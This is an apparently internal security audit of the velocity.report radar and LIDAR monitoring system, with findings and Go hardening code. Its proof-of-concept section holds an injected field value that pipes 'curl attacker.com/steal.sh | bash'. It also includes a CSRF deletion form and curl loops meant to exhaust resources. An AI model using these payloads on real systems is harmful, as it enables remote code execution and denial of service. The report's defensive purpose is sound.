# Security Analysis: velocity.report

**Analysis Date:** 2025-11-05
**Scope:** Complete codebase security review
**Focus:** Authentication, authorization, input validation, command injection, path traversal, data exposure

---

## Executive Summary

This security analysis identifies vulnerabilities in the velocity.report system with **prioritization for internal LAN deployments**. While the system is designed for trusted local networks (not public internet), hardening against malicious data ingestion and path manipulation remains critical for operational security.

### Deployment Context

**Target Environment:** Internal LAN only (Raspberry Pi on local network)
**Threat Model:** Trusted network, but hardened against:

- Malicious data injection via API
- Path traversal attacks
- Resource exhaustion
- Hardware damage via invalid commands

### Priority Classification

**HIGH Priority** (Harden before deployment):

- Command injection vulnerabilities (hardware damage risk)
- Path traversal (already mitigated, maintain coverage)
- Input validation for data ingestion
- Rate limiting on resource-intensive operations

**LOW Priority** (Internal LAN context):

- Authentication (trust boundary is network access)
- HTTPS/TLS (local network, no credential transmission)
- CSRF protection (no public-facing deployment)
- Advanced rate limiting (controlled user base)

---

## 1. Authentication & Authorization

### 1.1 No Authentication Mechanism

**Severity:** CRITICAL
**Location:** All HTTP endpoints
**Files:** `internal/api/server.go`, `internal/lidar/monitor/webserver.go`

**Issue:**

- Zero authentication on ANY endpoint
- Main API server (port 8080) completely open
- LIDAR monitoring endpoints completely open
- All endpoints accessible to anyone on the network

**Affected Endpoints:**

```
Main API Server (internal/api/server.go):
- POST /command - Send commands to radar hardware
- GET  /events - Retrieve all sensor events
- GET  /api/radar_stats - Statistics and measurements
- POST /api/generate_report - Generate PDF reports
- POST /api/sites - Create monitoring sites
- PUT  /api/sites/{id} - Modify site configuration
- DELETE /api/sites/{id} - Delete sites
- DELETE /api/reports/{id} - Delete reports
- GET  /api/reports/{id}/download - Download reports

LIDAR Server (internal/lidar/monitor/webserver.go):
- POST /api/lidar/persist - Persist background snapshots
- POST /api/lidar/params - Modify sensor parameters
- POST /api/lidar/grid_reset - Reset calibration grid
- POST /api/lidar/pcap/start - Load arbitrary PCAP files
- GET  /api/lidar/export_snapshot - Export sensor data
```

**Attack Scenarios:**

1. **Data Theft:** Any network user can download all traffic data, reports, and statistics
2. **Data Manipulation:** Attackers can modify site configurations, delete reports, inject false data
3. **Hardware Control:** `/command` endpoint allows sending arbitrary commands to radar hardware
4. **Resource Exhaustion:** Unlimited PDF generation requests can DOS the system
5. **Privacy Breach:** Export endpoints expose all collected traffic measurements

**Recommended Remediation:**

```go
// Example: Add authentication middleware
type AuthMiddleware struct {
    apiKey string
}

func (a *AuthMiddleware) Authenticate(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        key := r.Header.Get("X-API-Key")
        if key == "" || key != a.apiKey {
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }
        next.ServeHTTP(w, r)
    })
}

// Apply to all routes
server := &http.Server{
    Handler: authMiddleware.Authenticate(mux),
}
```

**Priority:** Implement immediately before any network deployment

---

### 1.2 No Role-Based Access Control

**Severity:** HIGH
**Issue:** No distinction between read-only and administrative operations

**Impact:**

- Cannot separate "view statistics" from "delete all data"
- No audit trail of who performed what action
- Single breach compromises everything

**Recommendation:** Implement role tiers:

- **Public:** Dashboard viewing only
- **Operator:** Report generation, data export
- **Admin:** Site configuration, data deletion, hardware commands

---

## 2. Command Injection Vulnerabilities

### 2.1 PDF Generation Command Injection

**Severity:** CRITICAL
**Location:** `internal/api/server.go:793-798`
**CVE Risk:** High (arbitrary code execution)

**Vulnerable Code:**

```go
pythonBin := os.Getenv("PDF_GENERATOR_PYTHON")
if pythonBin == "" {
    pythonBin = defaultPythonBin
    if _, err := os.Stat(pythonBin); os.IsNotExist(err) {
        pythonBin = "python3"  // Falls back to system python
    }
}

cmd := exec.Command(
    pythonBin,
    "-m", "pdf_generator.cli.main",
    configFile,  // Temp file with user-controlled JSON
)
```

**Attack Vector:**
User-controlled data flows into JSON config → Written to temp file → Passed to Python process

**Exploitable Fields in ReportRequest:**

```go
type ReportRequest struct {
    StartDate        string  `json:"start_date"`       // No validation
    EndDate          string  `json:"end_date"`         // No validation
    Timezone         string  `json:"timezone"`         // Basic validation only
    Units            string  `json:"units"`            // Basic validation only
    Source           string  `json:"source"`           // Basic validation only
    Location         string  `json:"location"`         // NO VALIDATION
    Surveyor         string  `json:"surveyor"`         // NO VALIDATION
    Contact          string  `json:"contact"`          // NO VALIDATION
    SiteDescription  string  `json:"site_description"` // NO VALIDATION
}
```

**Proof of Concept:**

```bash
curl -X POST http://localhost:8080/api/generate_report \
  -H "Content-Type: application/json" \
  -d '{
    "start_date": "2024-01-01",
    "end_date": "2024-01-31",
    "location": "\"; os.system(\"curl attacker.com/steal.sh | bash\"); #",
    "surveyor": "attacker"
  }'
```

If Python PDF generator uses these fields in shell commands or LaTeX without escaping, code execution occurs.

**Additional Risk:**

- `PDF_GENERATOR_PYTHON` environment variable can be hijacked
- Falls back to system `python3` which may be in attacker-controlled PATH
- No validation that Python binary is legitimate

**Remediation:**

1. **Validate all inputs:** Strict regex for all string fields
2. **Escape LaTeX special characters:** `\`, `{`, `}`, `$`, `&`, `%`, `#`, `_`, `^`, `~`
3. **Use absolute paths:** Never trust PATH or environment variables
4. **Sandbox Python execution:** Run PDF generator in isolated container
5. **Code review Python generator:** Ensure no `eval()`, `exec()`, `subprocess.shell=True`

---

### 2.2 Radar Command Injection

**Severity:** HIGH
**Location:** `internal/api/server.go:128-142`

**Vulnerable Code:**

```go
func (s *Server) sendCommandHandler(w http.ResponseWriter, r *http.Request) {
    command := r.FormValue("command")  // NO VALIDATION

    if err := s.m.SendCommand(command); err != nil {
        http.Error(w, "Failed to send command", http.StatusInternalServerError)
        return
    }
}
```

**Issue:**

- Accepts arbitrary commands from unauthenticated HTTP requests
- Sends directly to radar hardware via serial port
- No whitelist of allowed commands
- No validation of command format

**Attack Scenario:**

```bash
curl -X POST http://localhost:8080/command -d "command=malicious_binary_data"
```

**Potential Impact:**

- Damage radar hardware with invalid commands
- DOS by flooding with commands
- Data corruption by misconfiguring sensor
- Hardware bricking if critical parameters modified

**Remediation:**

```go
var allowedCommands = map[string]bool{
    "status": true,
    "reset":  true,
    "config": true,
}

func (s *Server) sendCommandHandler(w http.ResponseWriter, r *http.Request) {
    command := r.FormValue("command")

    if !allowedCommands[command] {
        http.Error(w, "Command not allowed", http.StatusForbidden)
        return
    }

    // Additional validation based on command type
    if err := validateCommand(command); err != nil {
        http.Error(w, "Invalid command format", http.StatusBadRequest)
        return
    }

    if err := s.m.SendCommand(command); err != nil {
        http.Error(w, "Failed to send command", http.StatusInternalServerError)
        return
    }
}
```

---

## 3. Path Traversal Vulnerabilities

### 3.1 Path Validation Implementation (GOOD)

**Positive Finding:** Comprehensive path validation exists
**Location:** `internal/security/pathvalidation.go`

**Good Practices Observed:**

```go
func ValidatePathWithinDirectory(filePath, safeDir string) error {
    // ✓ Resolves absolute paths
    // ✓ Handles symlink attacks via filepath.EvalSymlinks
    // ✓ Validates parent directories for non-existent paths
    // ✓ Rejects .. traversal attempts
    // ✓ Rejects absolute paths escaping safe directory
}
```

**Used Correctly In:**

- `internal/api/server.go:1047` - Report downloads validated against `pdf-generator/` directory
- `internal/lidar/monitor/webserver.go:735` - Export paths validated
- `internal/lidar/monitor/webserver.go:775` - Frame export paths validated

---

### 3.2 PCAP File Path Traversal (MITIGATED)

**Severity:** MEDIUM (Properly mitigated but worth documenting)
**Location:** `internal/lidar/monitor/webserver.go:1286-1378`

**Good Implementation:**

```go
func (ws *WebServer) resolvePCAPPath(candidate string) (string, error) {
    safeDirAbs, err := filepath.Abs(ws.pcapSafeDir)
    candidatePath := filepath.Join(safeDirAbs, candidate)
    canonicalPath, err := filepath.EvalSymlinks(resolvedPath)

    // Verify canonical path is within safe directory
    relPath, err := filepath.Rel(safeDirAbs, canonicalPath)
    if err || relPath == ".." || strings.HasPrefix(relPath, "..") {
        return "", errors.New("path traversal detected")
    }
}
```

**However:**

- PCAP endpoint still has no authentication
- Attacker can read any file in `pcapSafeDir`
- If `pcapSafeDir` is misconfigured (e.g., `/`), entire filesystem exposed

**Recommendation:** Authentication + restrictive `pcapSafeDir` configuration

---

### 3.3 Web Frontend Path Handling

**Severity:** LOW (Properly validated)
**Location:** `internal/api/server.go:1137-1209`

**Security Review:**

```go
if devMode {
    buildDir, err := filepath.Abs("./web/build")
    fullPath := filepath.Join(buildDir, requestedPath)

    // ✓ GOOD: Path validation present
    if err := security.ValidatePathWithinDirectory(fullPath, buildDir); err != nil {
        log.Printf("Security: rejected path %s: %v", fullPath, err)
        return false
    }
}
```

**Status:** Secure - path traversal properly prevented

---

## 4. SQL Injection Vulnerabilities

### 4.1 Parameterized Queries (GOOD)

**Positive Finding:** Most queries use parameterization
**Location:** `internal/db/db.go`

**Examples of Safe Queries:**

```go
// ✓ SAFE: Using placeholders
rows, err := db.Query(`SELECT ... FROM radar_objects WHERE max_speed > ? AND write_timestamp BETWEEN ? AND ?`,
    minSpeed, startUnix, endUnix)

// ✓ SAFE: Prepared statements
stmt.ExecContext(ctx, transitKey, threshold, start, end, ...)
```

---

### 4.2 Potential SQL Injection Risk

**Severity:** MEDIUM
**Location:** `internal/db/db.go` (various locations)

**Concerning Pattern:**
The code uses string concatenation for table/column names which cannot be parameterized:

```go
// Example (hypothetical risk if dataSource comes from user input)
var query string
if dataSource == "radar_objects" {
    query = "SELECT ... FROM radar_objects WHERE ..."
} else {
    query = "SELECT ... FROM radar_data_transits WHERE ..."
}
```

**Current Status:**

- `dataSource` is validated against whitelist in `server.go:252-255`
- This prevents injection BUT relies on frontend validation

**Risk:**
If validation is bypassed or removed, SQL injection becomes possible.

**Recommendation:**

```go
// Add server-side enum validation
const (
    DataSourceRadarObjects  = "radar_objects"
    DataSourceRadarTransits = "radar_data_transits"
)

func ValidateDataSource(source string) error {
    switch source {
    case DataSourceRadarObjects, DataSourceRadarTransits:
        return nil
    default:
        return fmt.Errorf("invalid data source: %s", source)
    }
}
```

---

## 5. Network Security

### 5.1 No TLS/HTTPS Support

**Severity:** HIGH
**Location:** `internal/api/server.go:1220`

**Issue:**

```go
server := &http.Server{
    Addr:    listen,
    Handler: LoggingMiddleware(mux),
}
// Only ListenAndServe, never ListenAndServeTLS
```

**Impact:**

- All traffic transmitted in cleartext
- API keys (if added) sent unencrypted
- Session cookies (if added) exposed to interception
- MITM attacks trivial on local network
- Privacy data (speed measurements) readable by network sniffers

**Attack Scenario:**

```bash
# Attacker on same network
sudo tcpdump -i wlan0 -A 'tcp port 8080'
# Captures all API requests/responses including sensitive data
```

**Recommendation:**

```go
// Generate self-signed cert for local network
// Or use Let's Encrypt for internet-facing deployments
server := &http.Server{
    Addr:    listen,
    Handler: LoggingMiddleware(mux),
    TLSConfig: &tls.Config{
        MinVersion: tls.VersionTLS13,
        CipherSuites: []uint16{
            tls.TLS_AES_128_GCM_SHA256,
            tls.TLS_AES_256_GCM_SHA384,
        },
    },
}
server.ListenAndServeTLS("cert.pem", "key.pem")
```

---

### 5.2 No CORS Configuration

**Severity:** MEDIUM
**Finding:** No CORS headers configured

**Issue:**

- Current behavior: Same-origin policy applies
- If API needs external access, CORS must be carefully configured
- Risk of overly permissive `Access-Control-Allow-Origin: *`

**Recommendation:**

```go
func CORSMiddleware(allowedOrigins []string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            origin := r.Header.Get("Origin")
            for _, allowed := range allowedOrigins {
                if origin == allowed {
                    w.Header().Set("Access-Control-Allow-Origin", origin)
                    w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
                    w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
                    break
                }
            }
            next.ServeHTTP(w, r)
        })
    }
}
```

---

### 5.3 No Rate Limiting

**Severity:** HIGH
**Finding:** Zero rate limiting on any endpoint

**Vulnerable Endpoints:**

- `/api/generate_report` - CPU/disk intensive PDF generation
- `/events` - Database query, can be large
- `/api/radar_stats` - Complex aggregation queries
- `/command` - Hardware commands

**Attack Scenarios:**

```bash
# DOS via report generation
for i in {1..1000}; do
  curl -X POST http://localhost:8080/api/generate_report \
    -H "Content-Type: application/json" \
    -d '{"start_date":"2020-01-01","end_date":"2024-12-31"}' &
done
# System exhausts disk space, CPU, memory
```

```bash
# Database DOS via stats queries
while true; do
  curl "http://localhost:8080/api/radar_stats?start=0&end=9999999999&group=15m" &
done
# Database locked, high CPU usage
```

**Recommendation:**

```go
import "golang.org/x/time/rate"

type RateLimiter struct {
    limiters map[string]*rate.Limiter
    mu       sync.Mutex
}

func (rl *RateLimiter) GetLimiter(ip string) *rate.Limiter {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    if limiter, exists := rl.limiters[ip]; exists {
        return limiter
    }

    // 10 requests per minute, burst of 20
    limiter := rate.NewLimiter(rate.Every(6*time.Second), 20)
    rl.limiters[ip] = limiter
    return limiter
}

func RateLimitMiddleware(rl *RateLimiter) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            ip := r.RemoteAddr
            limiter := rl.GetLimiter(ip)

            if !limiter.Allow() {
                http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
                return
            }

            next.ServeHTTP(w, r)
        })
    }
}
```

**Priority:** Implement before exposing to untrusted networks

---

## 6. Cross-Site Request Forgery (CSRF)

### 6.1 No CSRF Protection

**Severity:** HIGH
**Affected:** All state-changing endpoints

**Vulnerable Endpoints:**

- `POST /command` - Send radar commands
- `POST /api/generate_report` - Generate reports
- `POST /api/sites` - Create sites
- `PUT /api/sites/{id}` - Modify sites
- `DELETE /api/sites/{id}` - Delete sites
- `DELETE /api/reports/{id}` - Delete reports

**Attack Scenario:**

```html
<!-- Attacker's website -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://velocity-device.local:8080/api/sites/1" method="POST">
      <input type="hidden" name="_method" value="DELETE" />
    </form>
  </body>
</html>
```

If victim with authenticated session visits attacker's site, their site data gets deleted.

**Note:** Currently mitigated by lack of authentication (no sessions to hijack), but becomes critical once auth is added.

**Recommendation:**

```go
import "github.com/gorilla/csrf"

// Generate CSRF tokens
csrfMiddleware := csrf.Protect(
    []byte("32-byte-long-secret-key-here"),
    csrf.Secure(true), // Require HTTPS
    csrf.Path("/"),
)

mux := http.NewServeMux()
server := &http.Server{
    Handler: csrfMiddleware(mux),
}
```

---

## 7. Information Disclosure

### 7.1 Verbose Error Messages

**Severity:** MEDIUM
**Location:** Throughout `server.go`

**Issue:**
Error messages expose internal paths and implementation details:

```go
// Lines 747-749
s.writeJSONError(w, http.StatusInternalServerError,
    fmt.Sprintf("Failed to marshal config: %v", err))

// Line 770
s.writeJSONError(w, http.StatusInternalServerError,
    fmt.Sprintf("Failed to get working directory: %v", err))
```

**Information Leaked:**

- Internal file paths
- Database schema details
- Stack traces (potentially)
- Library versions from error messages

**Recommendation:**

```go
// Development: Full error details
if s.debugMode {
    s.writeJSONError(w, status, fmt.Sprintf("Error: %v", err))
} else {
    // Production: Generic message, log details server-side
    log.Printf("Internal error: %v", err)
    s.writeJSONError(w, status, "Internal server error")
}
```

---

### 7.2 Logging Sensitive Data

**Severity:** LOW
**Location:** `internal/api/server.go:759`

**Issue:**

```go
log.Printf("Report config written: %s (site.speed_limit_note=%q)", configFile, speedLimitNote)
```

**Concerns:**

- Logs may contain user-entered free-text fields
- Logs accessible to system administrators
- Log aggregation may expose data to unauthorized parties

**Recommendation:**

- Review all logging for sensitive data
- Implement log level controls
- Redact PII in production logs

---

## 8. Dependency & Supply Chain Security

### 8.1 Embedded SQL Injection via TailSQL

**Severity:** MEDIUM
**Location:** `internal/db/db.go` (references to `tailsql`)

**Finding:**

```go
import "github.com/tailscale/tailsql/server/tailsql"
// TailSQL provides SQL admin interface
```

**Concerns:**

- TailSQL provides raw SQL query interface to database
- If exposed without authentication, allows arbitrary data access
- Unknown if TailSQL endpoint is exposed on production

**Recommendation:**

1. Verify TailSQL is NOT exposed in production builds
2. If needed for debugging, restrict to localhost only
3. Require strong authentication for any admin endpoints

---

### 8.2 Dependency Versions

**Finding:** No automated dependency scanning detected

**Recommendation:**

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: "fs"
          scan-ref: "."
          format: "sarif"
          output: "trivy-results.sarif"
      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: "trivy-results.sarif"
```

---

## 9. Deployment Security

### 9.1 Service Configuration Review

**Location:** `velocity-report.service`

**Current Configuration:**

```ini
[Service]
User=velocity
Group=velocity
WorkingDirectory=/var/lib/velocity-report
ExecStart=/usr/local/bin/velocity-report --db-path /var/lib/velocity-report/sensor_data.db
```

**Security Assessment:**

**GOOD:**

- ✓ Runs as dedicated non-privileged user `velocity`
- ✓ Dedicated group `velocity`
- ✓ Stable working directory
- ✓ Automatic restart on failure

**MISSING:**

```ini
# Add these hardening options:
[Service]
# Restrict file system access
ReadWritePaths=/var/lib/velocity-report
ReadOnlyPaths=/usr/local/bin/velocity-report
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true

# Restrict network access
RestrictAddressFamilies=AF_INET AF_INET6
IPAddressDeny=any
IPAddressAllow=localhost 192.168.0.0/16  # Adjust for your network

# Capabilities
NoNewPrivileges=true
CapabilityBoundingSet=

# Restrict syscalls
SystemCallFilter=@system-service
SystemCallErrorNumber=EPERM
```

---

### 9.2 File Permissions

**Recommendation:**

```bash
# Database and data files
chown velocity:velocity /var/lib/velocity-report
chmod 700 /var/lib/velocity-report
chmod 600 /var/lib/velocity-report/sensor_data.db

# Executable
chown root:root /usr/local/bin/velocity-report
chmod 755 /usr/local/bin/velocity-report

# Log directory (if separate)
chown velocity:velocity /var/log/velocity-report
chmod 700 /var/log/velocity-report
```

---

## 10. Privacy & Data Protection

### 10.1 Privacy-by-Design Assessment

**POSITIVE FINDINGS:**

- ✓ No camera/video collection
- ✓ No license plate recognition
- ✓ Local-only storage (no cloud transmission)
- ✓ Anonymous speed measurements only

**CONCERNS:**

1. **Data Retention:** No automatic deletion policy
2. **Export Controls:** Anyone can export all historical data via API
3. **Aggregation Risk:** Fine-grained timestamps could enable traffic pattern analysis

**Recommendations:**

```go
// Add data retention policy
const maxDataRetentionDays = 90

func (db *DB) DeleteOldData(ctx context.Context) error {
    cutoff := time.Now().AddDate(0, 0, -maxDataRetentionDays).Unix()
    _, err := db.ExecContext(ctx,
        "DELETE FROM radar_data WHERE write_timestamp < ?", cutoff)
    return err
}

// Schedule periodic cleanup
func (db *DB) StartCleanupWorker(ctx context.Context) {
    ticker := time.NewTicker(24 * time.Hour)
    go func() {
        for {
            select {
            case <-ticker.C:
                if err := db.DeleteOldData(ctx); err != nil {
                    log.Printf("Data cleanup error: %v", err)
                }
            case <-ctx.Done():
                return
            }
        }
    }()
}
```

---

## 11. Phased Action Plan (Internal LAN Priority)

### Context: Internal LAN Deployment

This system is designed for **internal network deployment only** - typically a Raspberry Pi on a trusted local network. Security priorities focus on:

1. **Preventing hardware damage** from malicious commands
2. **Data integrity** against injection attacks
3. **Resource protection** against DoS/exhaustion
4. **Operational resilience** (not external threat defense)

Authentication, TLS, and CSRF protections are **low priority** given the trusted network context and lack of credential/session management.

---

### Phase 1: Critical - Data & Hardware Protection (BEFORE DEPLOYMENT)

**Timeline:** 3-5 days
**Focus:** Prevent system damage and data corruption

#### 1.1 Command Injection Hardening (HIGH PRIORITY)

**Severity:** CRITICAL for hardware safety
**Effort:** 2 days

**Actions:**

```go
// 1. Whitelist allowed radar commands
var allowedRadarCommands = map[string]bool{
    "OJstatus": true,  // Status query
    "OJreset":  true,  // Reset sensor
    // Add other safe commands from commands.go
}

func (s *Server) sendCommandHandler(w http.ResponseWriter, r *http.Request) {
    command := strings.TrimSpace(r.FormValue("command"))

    // Reject empty commands
    if command == "" {
        http.Error(w, "Command required", http.StatusBadRequest)
        return
    }

    // Whitelist validation
    if !allowedRadarCommands[command] {
        log.Printf("Rejected unauthorized command: %s from %s", command, r.RemoteAddr)
        http.Error(w, "Command not allowed", http.StatusForbidden)
        return
    }

    // Length limit (radar protocol constraint)
    if len(command) > 256 {
        http.Error(w, "Command too long", http.StatusBadRequest)
        return
    }

    if err := s.m.SendCommand(command); err != nil {
        http.Error(w, "Failed to send command", http.StatusInternalServerError)
        return
    }
}
```

**Deliverables:**

- [ ] Command whitelist implementation
- [ ] Length validation
- [ ] Logging of rejected commands
- [ ] Test suite for command validation

---

#### 1.2 PDF Generation Input Validation (HIGH PRIORITY)

**Severity:** HIGH (arbitrary code execution risk)
**Effort:** 2 days

**Actions:**

```go
// Strict validation regexes
var (
    dateRegex       = regexp.MustCompile(`^\d{4}-\d{2}-\d{2}$`)
    safeStringRegex = regexp.MustCompile(`^[a-zA-Z0-9\s\-.,@()]{1,200}$`)
    timezoneRegex   = regexp.MustCompile(`^[A-Za-z]+/[A-Za-z_]+$`)
)

func validateReportRequest(req *ReportRequest) error {
    // Date validation
    if !dateRegex.MatchString(req.StartDate) {
        return fmt.Errorf("invalid start_date format")
    }
    if !dateRegex.MatchString(req.EndDate) {
        return fmt.Errorf("invalid end_date format")
    }

    // String field validation (prevent injection)
    fields := map[string]string{
        "location":         req.Location,
        "surveyor":         req.Surveyor,
        "contact":          req.Contact,
        "site_description": req.SiteDescription,
    }

    for name, value := range fields {
        if value != "" && !safeStringRegex.MatchString(value) {
            return fmt.Errorf("invalid %s: contains unsafe characters", name)
        }
    }

    // Timezone validation
    if req.Timezone != "" && !timezoneRegex.MatchString(req.Timezone) {
        return fmt.Errorf("invalid timezone format")
    }

    // Units validation
    if req.Units != "mph" && req.Units != "kmph" {
        return fmt.Errorf("units must be 'mph' or 'kmph'")
    }

    return nil
}

// Apply in handler
func (s *Server) generateReport(w http.ResponseWriter, r *http.Request) {
    var req ReportRequest
    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        // ... existing error handling
    }

    // VALIDATE BEFORE PROCESSING
    if err := validateReportRequest(&req); err != nil {
        w.Header().Set("Content-Type", "application/json")
        s.writeJSONError(w, http.StatusBadRequest, fmt.Sprintf("Invalid request: %v", err))
        return
    }

    // ... continue with existing logic
}
```

**Deliverables:**

- [ ] Input validation functions
- [ ] Reject special characters in free-text fields
- [ ] Length limits on all string inputs
- [ ] Test cases for malicious inputs
- [ ] Log validation failures

---

#### 1.3 Path Traversal Verification (MAINTAIN EXISTING)

**Status:** ✅ Already implemented via `internal/security/pathvalidation.go`
**Effort:** 1 day verification

**Actions:**

- [ ] Audit all file operations use `security.ValidatePathWithinDirectory()`
- [ ] Verify symlink resolution in all paths
- [ ] Add test cases for edge cases
- [ ] Document safe path patterns in codebase

**Files to verify:**

```bash
# Grep for file operations not using security validation
grep -r "os.Open\|os.Create\|os.WriteFile\|http.ServeFile" internal/ cmd/ \
  | grep -v "security.Validate"
```

---

#### 1.4 Resource Limits (HIGH PRIORITY)

**Severity:** MEDIUM (operational resilience)
**Effort:** 1 day

**Actions:**

```go
// Simple per-IP rate limiting for expensive operations
import "golang.org/x/time/rate"

type ReportLimiter struct {
    limiters map[string]*rate.Limiter
    mu       sync.Mutex
}

func (rl *ReportLimiter) Allow(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    limiter, exists := rl.limiters[ip]
    if !exists {
        // 1 report per 30 seconds per IP
        limiter = rate.NewLimiter(rate.Every(30*time.Second), 1)
        rl.limiters[ip] = limiter
    }

    return limiter.Allow()
}

// Apply to report generation endpoint
func (s *Server) generateReport(w http.ResponseWriter, r *http.Request) {
    ip := r.RemoteAddr
    if !s.reportLimiter.Allow(ip) {
        s.writeJSONError(w, http.StatusTooManyRequests,
            "Rate limit exceeded. Please wait before generating another report.")
        return
    }

    // ... existing logic
}
```

**Deliverables:**

- [ ] Rate limiting on `/api/generate_report` (1 per 30s per IP)
- [ ] Rate limiting on `/command` endpoint (10 per minute per IP)
- [ ] Max concurrent report generation (e.g., 2 at a time)
- [ ] Configurable limits via environment variables

---

### Phase 2: Operational Hardening (WITHIN 2 WEEKS)

**Timeline:** 1 week
**Focus:** Improve robustness and monitoring

#### 2.1 Enhanced Logging (MEDIUM PRIORITY)

**Effort:** 1 day

**Actions:**

- [ ] Log all report generation requests (params, IP, timestamp, outcome)
- [ ] Log all radar commands (command, IP, timestamp, success/fail)
- [ ] Log path validation failures
- [ ] Log rate limit violations
- [ ] Structured logging (JSON format for parsing)

```go
log.Printf("[AUDIT] action=generate_report ip=%s start_date=%s end_date=%s status=success",
    r.RemoteAddr, req.StartDate, req.EndDate)
```

---

#### 2.2 Service Hardening (MEDIUM PRIORITY)

**Effort:** 1 day

**Update `velocity-report.service`:**

```ini
[Service]
# Existing good practices
User=velocity
Group=velocity
WorkingDirectory=/var/lib/velocity-report

# Add hardening
ReadWritePaths=/var/lib/velocity-report /tmp
ReadOnlyPaths=/usr/local/bin
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
NoNewPrivileges=true
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX

# Resource limits
LimitNOFILE=1024
LimitNPROC=64
MemoryMax=512M
CPUQuota=80%
```

**Deliverables:**

- [ ] Updated systemd service file
- [ ] File permission audit (700 for data, 755 for binaries)
- [ ] Test service restart/failure recovery

---

#### 2.3 Database Query Validation (LOW-MEDIUM PRIORITY)

**Effort:** 1 day

**Actions:**

```go
// Server-side enum validation for data sources
func ValidateDataSource(source string) error {
    switch source {
    case "radar_objects", "radar_data_transits":
        return nil
    default:
        return fmt.Errorf("invalid data source: %s", source)
    }
}

// Apply before any query construction
func (s *Server) showRadarObjectStats(w http.ResponseWriter, r *http.Request) {
    dataSource := r.URL.Query().Get("source")
    if dataSource == "" {
        dataSource = "radar_data_transits"
    }

    if err := ValidateDataSource(dataSource); err != nil {
        s.writeJSONError(w, http.StatusBadRequest, err.Error())
        return
    }

    // ... existing logic
}
```

**Deliverables:**

- [ ] Server-side validation for `source` parameter
- [ ] Validation for `group` parameter (against supportedGroups map)
- [ ] Numeric bounds checking (min_speed, dates, etc.)

---

### Phase 3: Optional Enhancements (FUTURE/LOW PRIORITY)

**Timeline:** As needed
**Context:** These are low priority for internal LAN deployment

#### 3.1 Authentication (LOW PRIORITY for LAN)

**When to implement:**

- If device will be internet-accessible
- If multiple untrusted users on LAN
- Compliance requirements emerge

**Simple API Key approach:**

```go
func APIKeyMiddleware(validKey string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            key := r.Header.Get("X-API-Key")
            if key != validKey {
                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}
```

---

#### 3.2 HTTPS/TLS (LOW PRIORITY for LAN)

**When to implement:**

- Remote access requirements
- Compliance mandates
- Multi-site deployments over WAN

**Simple self-signed cert:**

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

#### 3.3 CSRF Protection (LOW PRIORITY for LAN)

**When to implement:**

- After implementing authentication/sessions
- If web frontend deployed to untrusted users
- Currently N/A (no authentication = no sessions to hijack)

---

### Phase 4: Ongoing Maintenance

**Continuous activities:**

1. **Dependency Updates** (monthly)

   ```bash
   go get -u ./...
   go mod tidy
   ```

2. **Security Scanning** (on commits)

   ```bash
   gosec ./...
   ```

3. **Log Review** (weekly)

   - Check for unusual patterns
   - Monitor rate limit violations
   - Review rejected commands

4. **Backup Strategy**
   - Daily database backups
   - Retention policy (90 days recommended)

---

### Implementation Priority Summary

| Phase       | Item                 | Priority     | Effort | Risk Reduction             |
| ----------- | -------------------- | ------------ | ------ | -------------------------- |
| **Phase 1** | Command whitelist    | **CRITICAL** | 2 days | Hardware damage prevention |
|             | PDF input validation | **CRITICAL** | 2 days | Code injection prevention  |
|             | Path traversal audit | **HIGH**     | 1 day  | Data exposure prevention   |
|             | Rate limiting        | **HIGH**     | 1 day  | DoS prevention             |
| **Phase 2** | Enhanced logging     | **MEDIUM**   | 1 day  | Incident detection         |
|             | Service hardening    | **MEDIUM**   | 1 day  | System isolation           |
|             | Query validation     | **MEDIUM**   | 1 day  | SQL injection prevention   |
| **Phase 3** | Authentication       | **LOW**      | 2 days | LAN trusted boundary       |
|             | HTTPS/TLS            | **LOW**      | 1 day  | LAN cleartext acceptable   |
|             | CSRF                 | **LOW**      | 1 day  | No sessions currently      |

**Total Phase 1 Effort:** ~6 days
**Total Phase 2 Effort:** ~3 days
**Phase 3:** Optional/future

---

### Success Criteria

**Phase 1 Complete when:**

- [ ] All radar commands validated against whitelist
- [ ] All PDF generation inputs strictly validated
- [ ] All file operations audited for path traversal protection
- [ ] Rate limiting active on expensive endpoints
- [ ] Test suite covers injection attack vectors
- [ ] No `gosec` critical findings

**Phase 2 Complete when:**

- [ ] Audit logs capture all security-relevant events
- [ ] Systemd service has resource limits configured
- [ ] Database query parameters validated server-side
- [ ] File permissions hardened per recommendations

**Production Ready when:**

- Phase 1 complete
- Phase 2 complete (recommended)
- Test deployment on isolated network segment
- Incident response plan documented

---

## 12. Security Testing Recommendations

### 12.1 Automated Testing

```bash
# Install security testing tools
go install github.com/securego/gosec/v2/cmd/gosec@latest

# Run static analysis
gosec ./...

# Check for known vulnerabilities
go list -json -m all | nancy sleuth
```

### 12.2 Manual Testing Checklist

- [ ] Attempt path traversal on all file operations
- [ ] SQL injection attempts on all query parameters
- [ ] Command injection on PDF generation
- [ ] CSRF attacks on state-changing endpoints
- [ ] Rate limit bypass attempts
